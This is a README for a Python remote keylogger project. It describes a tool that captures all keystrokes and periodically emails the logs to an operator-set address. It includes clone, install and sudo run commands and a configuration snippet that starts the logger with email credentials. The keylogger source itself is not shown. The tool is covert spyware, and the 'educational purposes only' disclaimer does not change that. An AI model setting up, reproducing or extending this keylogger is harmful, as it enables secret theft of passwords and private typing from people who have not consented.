# Remote Keylogger in Python

This project is a **remote keylogger** implemented in Python, designed to capture keystrokes and periodically send them via email. The project consists of two scripts: `keylogger.py`, which contains the core functionality as a class, and `zkeylogger.py`, the script that initializes and executes the keylogger.

## Features
- Captures all keyboard inputs, including printable and special keys.
- Sends logs to a specified email address at regular intervals.
- Utilizes `pynput` for keylogging and `smtplib` for secure email transmission.
- Easily customizable reporting interval and email credentials.

## Prerequisites
Before running the scripts, ensure the following:
- Python 3.x is installed on your system.
- Required Python libraries:
  - `pynput`
  - `smtplib` (included by default in Python)
- Access to an email account with SMTP enabled (e.g., Zoho Mail, as Gmail no longer supports SMTP for standard apps).
- *NOTE:* The `keylogger.py` code uses zoho SMTP and one is encouraged to tailor it to their needs.

## Installation
1. Clone this repository:
   ```bash
   git clone https://github.com/mghtyspm/remote-keylogger.git
   cd remote-keylogger
   ```
2. Install dependencies:
   ```bash
   pip install pynput
   ```

## Usage
1. Open `keylogger.py` and set the following:
   - `email`: Your email address (to receive logs).
   - `password`: The email account's password.
   - `time_interval`: Time in seconds between email reports.

2. Run the keylogger using:
   ```bash
   sudo python zkeylogger.py
   ```

3. The keylogger will start capturing keystrokes and send reports to the configured email address.

## Example Configuration
```python
# zkeylogger.py
import keylogger
my_keylogger = keylogger.Keylogger(120, "your-email@zoho.com", "your-email-password")
my_keylogger.start()
```

## Important Notes
- **Educational Purposes Only**: This tool is strictly for learning and research in a controlled environment. Unauthorized use is illegal and unethical.
- Ensure you have proper permissions to use this on any device.
- Gmail no longer supports SMTP for standard apps as of January 2025. Use alternatives like Zoho Mail for SMTP-based configurations.

## Troubleshooting
- If you encounter an `SMTPAuthenticationError`, ensure:
  - Email and password are correct.
  - SMTP is enabled for the email account.
  - App-specific passwords are used if required (e.g., for Zoho Mail).

## Disclaimer
The creators of this project are not responsible for any misuse. Always adhere to ethical practices and obtain proper consent before using such tools.

---

Happy coding!
